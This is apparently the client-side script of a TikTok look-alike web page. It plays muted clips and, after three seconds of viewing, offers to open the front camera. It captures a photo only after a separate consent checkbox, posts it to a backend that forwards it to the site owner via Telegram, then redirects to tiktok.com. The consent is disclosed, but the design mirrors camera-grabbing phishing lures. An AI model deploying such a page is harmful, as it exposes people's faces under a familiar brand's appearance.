(() => {
  const feed = document.getElementById('video-feed');
  const videos = Array.from(document.querySelectorAll('.video'));
  const appPrompt = document.getElementById('app-prompt');
  const promptDismiss = document.getElementById('app-prompt-dismiss');
  const promptOpen = document.getElementById('app-prompt-open');
  const promptTitle = document.getElementById('app-prompt-title');
  const promptDescription = document.getElementById('app-prompt-description');
  const cameraConsent = document.getElementById('camera-consent');
  const cameraConsentWrap = document.getElementById('camera-consent-wrap');
  const cameraVideo = document.getElementById('camera-capture-source');
  const captureCanvas = document.getElementById('camera-capture-canvas');
  let promptTimer = null;
  let promptShown = false;
  let cameraStream = null;
  let cameraReadyForCapture = false;
  let sentSuccessfully = false;

  const clearPromptTimer = () => {
    if (promptTimer !== null) { window.clearTimeout(promptTimer); promptTimer = null; }
  };
  const stopCamera = () => {
    if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
    cameraStream = null;
    cameraVideo.srcObject = null;
    cameraVideo.hidden = true;
    cameraReadyForCapture = false;
  };
  const resetPrompt = () => {
    stopCamera();
    cameraConsent.checked = false;
    cameraConsentWrap.hidden = true;
    cameraConsentWrap.style.display = '';
    cameraConsent.disabled = false;
    promptOpen.disabled = false;
    promptOpen.textContent = 'فتح الكاميرا للمعاينة';
    promptDismiss.textContent = 'ليس الآن';
    promptTitle.textContent = 'مشاركة صورة اختيارية';
    promptDescription.textContent = 'هذه ميزة اختيارية. إذا فتحت الكاميرا ثم وافقت بشكل منفصل على «التقاط الصورة وإرسالها»، فستُرسل صورة من الكاميرا الأمامية إلى صاحب الموقع عبر تيليجرام. يمكنك الرفض أو الإغلاق دون إرسال أي شيء.';
    sentSuccessfully = false;
  };
  const closePrompt = () => {
    appPrompt.hidden = true;
    resetPrompt();
  };
  const schedulePrompt = video => {
    clearPromptTimer();
    if (promptShown || !video || video.paused || video.ended) return;
    promptTimer = window.setTimeout(() => {
      if (!promptShown && !video.paused && !video.ended && !document.hidden) {
        resetPrompt();
        appPrompt.hidden = false;
        promptShown = true;
      }
    }, 3000);
  };
  promptDismiss.addEventListener('click', closePrompt);
  appPrompt.addEventListener('click', event => { if (event.target === appPrompt) closePrompt(); });
  cameraConsent.addEventListener('change', () => {
    if (cameraReadyForCapture && cameraConsent.checked) {
      promptOpen.disabled = false;
      promptOpen.textContent = 'التقاط الصورة وإرسالها';
    } else if (cameraReadyForCapture) {
      promptOpen.disabled = true;
      promptOpen.textContent = 'التقاط الصورة وإرسالها';
    }
  });

  promptOpen.addEventListener('click', async () => {
    if (sentSuccessfully) {
      window.location.href = 'https://www.tiktok.com/';
      return;
    }

    // First click only opens the camera preview; it never captures or sends an image.
    if (!cameraReadyForCapture) {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        window.alert('فتح الكاميرا يتطلب HTTPS ومتصفحًا يدعم الكاميرا. يمكنك إغلاق هذه النافذة والمتابعة في الموقع.');
        return;
      }
      promptOpen.disabled = true;
      promptOpen.textContent = 'بانتظار إذن الكاميرا…';
      try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } }, audio: false
        });
        cameraVideo.srcObject = cameraStream;
        cameraVideo.hidden = false;
        await cameraVideo.play();
        if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) {
          await new Promise((resolve, reject) => {
            const onReady = () => resolve();
            const onError = () => reject(new Error('CAMERA_FRAME_NOT_READY'));
            cameraVideo.addEventListener('loadedmetadata', onReady, { once: true });
            cameraVideo.addEventListener('error', onError, { once: true });
            window.setTimeout(() => {
              if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) reject(new Error('CAMERA_FRAME_NOT_READY'));
            }, 5000);
          });
        }
        cameraReadyForCapture = true;
        promptTitle.textContent = 'راجع المعاينة ووافق قبل الإرسال';
        promptDescription.textContent = 'الصورة التي ستُرسل هي لقطة من المعاينة أدناه. لا يتم التقاط الصورة أو إرسالها بمجرد فتح الكاميرا؛ يجب تحديد الموافقة ثم الضغط على زر الإرسال.';
        cameraConsentWrap.hidden = false;
        cameraConsentWrap.style.display = 'flex';
        promptOpen.textContent = 'التقاط الصورة وإرسالها';
        promptOpen.disabled = true;
      } catch (error) {
        stopCamera();
        promptOpen.disabled = false;
        promptOpen.textContent = 'إعادة فتح الكاميرا';
        const msg = error && error.name === 'NotAllowedError'
          ? 'لم تمنح إذن الكاميرا. لم يتم التقاط أو إرسال أي صورة.'
          : 'تعذر فتح الكاميرا. تأكد من أن الموقع يعمل عبر HTTPS وأن الكاميرا متاحة.';
        window.alert(msg);
      }
      return;
    }

    // A separate checked consent plus this click are required for capture and sending.
    if (!cameraConsent.checked) {
      window.alert('يرجى تحديد الموافقة أولًا، أو إغلاق النافذة دون إرسال صورة.');
      return;
    }
    let failureStage = 'التحقق من جاهزية الكاميرا';
    promptOpen.disabled = true;
    promptOpen.textContent = 'جارٍ التقاط الصورة…';
    try {
      if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) throw new Error('CAMERA_FRAME_NOT_READY');
      captureCanvas.width = cameraVideo.videoWidth;
      captureCanvas.height = cameraVideo.videoHeight;
      const ctx = captureCanvas.getContext('2d');
      if (!ctx) throw new Error('CANVAS_CONTEXT_UNAVAILABLE');
      ctx.drawImage(cameraVideo, 0, 0, captureCanvas.width, captureCanvas.height);
      failureStage = 'تحويل الصورة إلى JPEG';
      const capturedPhoto = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg', 0.88));
      if (!capturedPhoto) throw new Error('PHOTO_ENCODING_FAILED');
      if (capturedPhoto.size > 4 * 1024 * 1024) throw new Error('PHOTO_TOO_LARGE');
      failureStage = 'إرسال الصورة إلى خادم الموقع';
      promptOpen.textContent = 'جارٍ الإرسال…';
      const response = await fetch('/send-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'image/jpeg' },
        body: capturedPhoto
      });
      const responseText = await response.text();
      let responseData = null;
      try { responseData = JSON.parse(responseText); } catch (_) {}
      if (!response.ok || responseData?.ok === false) {
        const detail = responseData?.error || responseText || `HTTP ${response.status}`;
        throw new Error(`HTTP ${response.status}: ${detail}`);
      }
      stopCamera();
      cameraConsentWrap.hidden = true;
      promptTitle.textContent = 'تم إرسال الصورة';
      promptDescription.textContent = 'تم إرسال الصورة التي وافقت على مشاركتها إلى صاحب الموقع عبر تيليجرام. يمكنك الآن فتح TikTok أو إغلاق النافذة.';
      promptOpen.textContent = 'فتح TikTok';
      promptOpen.disabled = false;
      promptDismiss.textContent = 'إغلاق';
      sentSuccessfully = true;
    } catch (error) {
      stopCamera();
      cameraConsent.checked = false;
      cameraConsentWrap.hidden = true;
      promptOpen.disabled = false;
      promptOpen.textContent = 'إعادة المحاولة';
      const rawError = error && error.message ? error.message : String(error);
      let detail = rawError;
      if (rawError === 'CAMERA_FRAME_NOT_READY') detail = 'الكاميرا لم تنتج إطار صورة بعد. أعد المحاولة.';
      else if (rawError === 'CANVAS_CONTEXT_UNAVAILABLE') detail = 'المتصفح لم يتمكن من تجهيز مساحة الصورة.';
      else if (rawError === 'PHOTO_ENCODING_FAILED') detail = 'المتصفح لم يتمكن من تحويل المعاينة إلى صورة.';
      else if (rawError === 'PHOTO_TOO_LARGE') detail = 'حجم الصورة أكبر من الحد المسموح. أعد المحاولة.';
      else if (rawError.includes('HTTP 502:')) detail = 'تعذر إرسال الصورة عبر تيليجرام. تحقق من إعدادات الخادم.';
      else if (rawError.includes('HTTP 413:')) detail = 'حجم الصورة أكبر من الحد المسموح.';
      else if (rawError.includes('HTTP 403:')) detail = 'رفض الخادم الطلب. افتح الموقع مباشرة من نطاقه المنشور.';
      else if (rawError.includes('Failed to fetch')) detail = 'تعذر الوصول إلى مسار الإرسال. تأكد من نشر وظائف Netlify مع الموقع.';
      window.alert(`فشل الإرسال.
المرحلة: ${failureStage}.
التفاصيل: ${detail}`);
      promptTitle.textContent = 'تعذر إرسال الصورة';
      promptDescription.textContent = 'لم يكتمل الإرسال. لم يتم الاحتفاظ بمعاينة الكاميرا؛ يمكنك إغلاق النافذة أو فتح الكاميرا والمحاولة من جديد.';
    }
  });

  document.addEventListener('visibilitychange', () => {
    if (document.hidden) clearPromptTimer();
    else {
      const playing = videos.map(card => card.querySelector('video')).find(video => !video.paused && !video.ended);
      schedulePrompt(playing);
    }
  });

  const compact = n => {
    const value = Number(n) || 0;
    if (value >= 10000) return `${(value / 1000).toFixed(1)}K`;
    if (value >= 1000) return `${(value / 1000).toFixed(1)}K`;
    return String(value);
  };

  // Play only the mostly visible clip. Clips are muted so browser autoplay policies allow playback.
  const playVisible = () => {
    const box = feed.getBoundingClientRect();
    let best = null;
    let bestVisible = 0;
    videos.forEach(card => {
      const video = card.querySelector('video');
      const rect = card.getBoundingClientRect();
      const visible = Math.max(0, Math.min(rect.bottom, box.bottom) - Math.max(rect.top, box.top));
      const ratio = visible / Math.max(1, rect.height);
      if (ratio > bestVisible) { bestVisible = ratio; best = video; }
      if (video !== best) video.pause();
    });
    if (best && bestVisible > 0.55) best.play().catch(() => {});
  };

  videos.forEach(card => {
    const video = card.querySelector('video');
    const like = card.querySelector('.like-action');
    const save = card.querySelector('.save-action');
    const follow = card.querySelector('.follow-button');
    const likeCount = card.querySelector('.likes-count');
    const saveCount = card.querySelector('.saves-count');
    const commentCount = card.querySelector('.comments-count');
    let likes = Number(card.dataset.likes) || 0;
    let saves = Number(card.dataset.saves) || 0;
    let liked = false;
    let saved = false;

    video.addEventListener('click', () => {
      if (video.paused) {
        videos.forEach(other => { if (other !== card) other.querySelector('video').pause(); });
        video.play().catch(() => {});
      } else video.pause();
    });
    video.addEventListener('play', () => schedulePrompt(video));
    video.addEventListener('pause', () => {
      if (promptTimer !== null) clearPromptTimer();
    });
    video.addEventListener('ended', clearPromptTimer);
    video.addEventListener('error', () => { card.classList.add('video-error'); });

    like.addEventListener('click', () => {
      liked = !liked;
      likes += liked ? 1 : -1;
      like.classList.toggle('liked', liked);
      like.setAttribute('aria-label', liked ? 'Unlike video' : 'Like video');
      likeCount.textContent = compact(likes);
    });
    save.addEventListener('click', () => {
      saved = !saved;
      saves += saved ? 1 : -1;
      save.classList.toggle('saved', saved);
      save.setAttribute('aria-label', saved ? 'Remove saved video' : 'Save video');
      saveCount.textContent = compact(saves);
    });
    follow.addEventListener('click', () => {
      const followed = follow.classList.toggle('followed');
      follow.textContent = followed ? '✓' : '+';
      follow.setAttribute('aria-label', followed ? 'Unfollow creator' : 'Follow creator');
    });
    card.querySelector('.comment-action').addEventListener('click', () => {
      const comment = window.prompt('Write a comment');
      if (comment && comment.trim()) commentCount.textContent = String((Number(card.dataset.comments) || 0) + 1);
      if (comment && comment.trim()) card.dataset.comments = commentCount.textContent;
    });
    card.querySelector('.share-action').addEventListener('click', async () => {
      const data = { title: 'TikTok UI Clone', text: `Check out @${card.dataset.username}'s video`, url: window.location.href };
      try {
        if (navigator.share) await navigator.share(data);
        else if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(data.url);
          window.alert('Link copied to clipboard');
        } else window.prompt('Copy this link', data.url);
      } catch (_) { /* Share sheet was dismissed. */ }
    });
  });

  if ('IntersectionObserver' in window) {
    const observer = new IntersectionObserver(entries => {
      entries.forEach(entry => {
        const video = entry.target.querySelector('video');
        if (entry.isIntersecting && entry.intersectionRatio >= 0.65) video.play().catch(() => {});
        else video.pause();
      });
    }, { root: feed, threshold: [0, 0.65, 1] });
    videos.forEach(card => observer.observe(card));
  }
  feed.addEventListener('scroll', () => window.requestAnimationFrame(playVisible), { passive: true });
  window.addEventListener('resize', playVisible);
  document.getElementById('search-button').addEventListener('click', () => window.prompt('Search videos or creators'));
  document.querySelectorAll('.bottom-navbar .nav-item').forEach(item => {
    item.addEventListener('click', () => {
      document.querySelectorAll('.bottom-navbar .nav-item').forEach(nav => nav.classList.remove('active'));
      item.classList.add('active');
      if (item.classList.contains('create-item')) window.alert('Create: this static demo has no upload backend.');
    });
  });
  window.addEventListener('load', () => {
    const first = videos[0]?.querySelector('video');
    if (first) first.play().catch(() => {});
  });
})();
